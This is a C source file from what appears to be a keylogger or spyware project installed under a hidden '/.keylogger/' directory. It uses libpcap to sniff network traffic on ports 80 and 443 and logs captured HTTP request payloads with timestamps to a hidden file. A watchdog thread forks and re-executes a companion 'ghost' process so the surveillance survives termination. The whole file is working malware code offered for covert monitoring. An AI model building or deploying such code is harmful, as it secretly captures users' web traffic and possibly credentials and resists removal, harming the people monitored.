#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdbool.h>
#include <stdlib.h>

#include <pcap.h>

#include "ip.h"
#include "http.h"
#include "process.h"
#include "timed_logger.h"

#define TCP_PROTOCOL 6

/* TODO: Can these be used in pcap filter */
#define HTTP_PORT 80
#define HTTPS_PORT 443

/* TODO: Uncomment this. static const int PCAP_ERRBUF_SIZE = 100 */

pid_t exec_ghost();
void* keep_ghost_alive(void *args);
void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

int main(int argc, char **argv)
{
    pid_t id = -1;
    if (argc >= 2)
        id = atoi(argv[1]);

    pthread_t aliver;
    pthread_create(&aliver, NULL, keep_ghost_alive, &id);

    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
    if (network_log == NULL)
    {
        printf("Error opening network log. Exiting...");
        exit(1);
    }
    setbuf(network_log, NULL);

    struct loginfo info = { network_log, NEVER_WRITTEN, 4 };

    /* Variables for pcap sniffing, such as error buffer, device to be read
       and filters, masks, etc. */
    char *dev, errbuf[100];
    pcap_t *handle;
    struct bpf_program filter;
    bpf_u_int32 mask;
    bpf_u_int32 net;

    /* Create the default pcap device and exit if error occurs */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL)
    {
        printf("No default device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Find the netmask for the chosen device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) < 0)
    {
        printf("Can't get netmask for device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Create a handle to start sniffing packets in non promiscuous
       mode. */
    handle = pcap_open_live(dev, 1518, true, 1000, errbuf);
    if (handle == NULL)
    {
        printf("Couldn't open device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Handle the creation of the filter compilation and installing */
    if (pcap_compile(handle, &filter, "tcp port 80 or tcp port 443", 0, net) < 0)
    {
        printf("Couldn't create filter: %s. Exiting...", pcap_geterr(handle));
        exit(1);
    }

    if (pcap_setfilter(handle, &filter) < 0)
    {
        printf("Couldn't install filter: %s. Exiting...", pcap_geterr(handle));
        exit(1);
    }

    pcap_loop(handle, -1, packet_received, (u_char*) &info);

    pcap_freecode(&filter);
    pcap_close(handle);
    pthread_join(aliver, NULL);

    fclose(network_log);

    return 0;
}

pid_t exec_ghost()
{
    pid_t parent_id = getpid();
    pid_t id = fork();

    if (id < 0)
    {
        printf("There was an error forking. Exiting...\n");
        exit(1);
    }
    else if (id == 0)
    {
        char str_id[6];
        sprintf(str_id, "%d", parent_id);

        printf("Starting ghost...\n");
        execlp("/.keylogger/./ghost", "./ghost", str_id, NULL);
    }

    return id;
}

void* keep_ghost_alive(void *args)
{
    pid_t cur_pid = *((int *) args);
    while(1)
    {
        cur_pid = process_periodic_check(cur_pid, 5, -1, exec_ghost);
        wait(NULL);
    }
}

void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct loginfo *info = (struct loginfo*) args;

    struct ethernet_header *eth;
    struct ip_header *ip;
    struct tcp_header *tcp;
    const u_char *payload;
    u_int p_size;

    if (process_packet(packet, &eth, &ip, &tcp, &payload, &p_size) < 0)
    {
        printf("There was an error processing the packet.");
        exit(1);
    }

    if (p_size > 0)
    {
        if (is_http_request(payload, p_size))
        {
            timestamped_write(info, payload);
            timestamped_write(info, "\n");
        }
    }
}
